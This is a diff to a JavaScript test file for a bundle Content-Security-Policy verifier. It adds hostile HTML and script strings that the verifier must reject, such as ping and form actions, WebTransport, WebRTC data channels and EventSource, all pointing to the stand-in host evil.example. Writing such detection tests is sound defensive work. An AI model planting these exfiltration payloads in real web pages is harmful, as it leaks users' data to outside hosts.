@@ -69,6 +69,9 @@ test('bundle CSP verifier rejects linked and syntactically hidden authorities', 
       '<img srcset="https://evil.example/a.png 1x">',
       '<link rel="modulepreload" href="//evil.example/chunk.js">',
       '<link rel="preload" href="data:text/javascript,alert(1)">',
+      '<a href="/safe" ping="https://evil.example/collect">safe</a>',
+      '<form action="https://evil.example/submit"></form>',
+      '<button formaction="//evil.example/submit">submit</button>',
     ]) {
       writeFileSync(htmlPath, validHtml.replace('</head>', `${hostile}</head>`))
       assert.throws(verify)
@@ -98,6 +101,10 @@ test('bundle CSP verifier rejects linked and syntactically hidden authorities', 
       'new XML\\u0048ttpRequest()',
       'navigator["send" + "Beacon"]("/leak", data)',
       '(0, fetch)("https://evil.example/minified")',
+      'new WebTransport("https://evil.example/session")',
+      'new RTCPeerConnection().createDataChannel("leak")',
+      'new webkitRTCPeerConnection()',
+      'const Stream = EventSource; new Stream("https://evil.example/events")',
     ]) {
       writeFileSync(jsPath, hostileJavaScript)
       assert.throws(verify)
